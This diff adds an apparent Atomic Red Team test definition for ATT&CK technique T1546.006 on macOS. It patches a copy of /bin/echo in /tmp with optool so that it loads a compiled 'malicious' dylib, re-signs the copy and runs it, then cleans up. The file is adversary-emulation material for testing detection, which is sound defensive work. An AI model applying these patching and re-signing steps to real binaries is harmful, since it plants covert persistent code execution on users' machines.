@@ -1,0 +1,55 @@
+attack_technique: T1546.006
+display_name: 'Event Triggered Execution: LC_LOAD_DYLIB Addition'
+atomic_tests:
+- name: Add LC_LOAD_DYLIB Load Command to a Mach-O Binary with optool
+  auto_generated_guid: d23c4496-dff6-4014-a7ff-f5c7e86e4aee
+  description: |
+    Patches a copy of a benign Mach-O binary to add a new `LC_LOAD_DYLIB` load command pointing at an
+    adversary-controlled dylib, using the open-source `optool` utility, then ad-hoc re-signs the
+    patched binary since the patch invalidates its original signature. Every subsequent time the
+    patched binary is executed, the attacker's dylib is loaded and its constructor runs automatically,
+    persisting execution without needing to touch the original binary's code. This is the technique
+    and tooling referenced directly in the ATT&CK description for this sub-technique.
+
+    NOTE: this test only patches a copy of a non-system binary in /tmp; it never modifies a real
+    system binary, which would additionally be blocked by System Integrity Protection (SIP).
+
+    Reference: https://github.com/alexzielenski/optool
+  supported_platforms:
+  - macos
+  input_arguments:
+    target_binary:
+      description: Copy of a benign binary that will have the malicious LC_LOAD_DYLIB command added.
+      type: path
+      default: /tmp/T1546.006_target
+    dylib_source:
+      description: Source for the malicious dylib to be loaded by the patched binary.
+      type: path
+      default: PathToAtomicsFolder/T1546.006/src/MacOS/T1546.006.c
+    malicious_dylib:
+      description: Path to the compiled malicious dylib.
+      type: path
+      default: /tmp/T1546.006_payload.dylib
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      optool must be installed, and a copy of a benign binary plus the compiled malicious dylib must exist
+    prereq_command: |
+      if command -v optool >/dev/null 2>&1 && [ -f #{target_binary} ] && [ -f #{malicious_dylib} ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      (command -v optool >/dev/null 2>&1) || (command -v brew >/dev/null 2>&1 && brew install optool) || (git clone --recursive https://github.com/alexzielenski/optool.git /tmp/optool_src && cd /tmp/optool_src && xcodebuild -project optool.xcodeproj -configuration Release SYMROOT=build && cp build/Release/optool /usr/local/bin/optool)
+      cp /bin/echo #{target_binary}
+      chmod +x #{target_binary}
+      gcc -dynamiclib #{dylib_source} -o #{malicious_dylib}
+  executor:
+    command: |
+      cp #{target_binary} #{target_binary}.bak
+      optool install -c load -p "#{malicious_dylib}" -t #{target_binary}
+      codesign --sign - --force #{target_binary}
+      #{target_binary} test
+      cat /tmp/T1546.006_dylib_loaded.txt
+    cleanup_command: |
+      mv -f #{target_binary}.bak #{target_binary}
+      rm -f #{malicious_dylib} /tmp/T1546.006_dylib_loaded.txt
+    name: bash
+    elevation_required: false
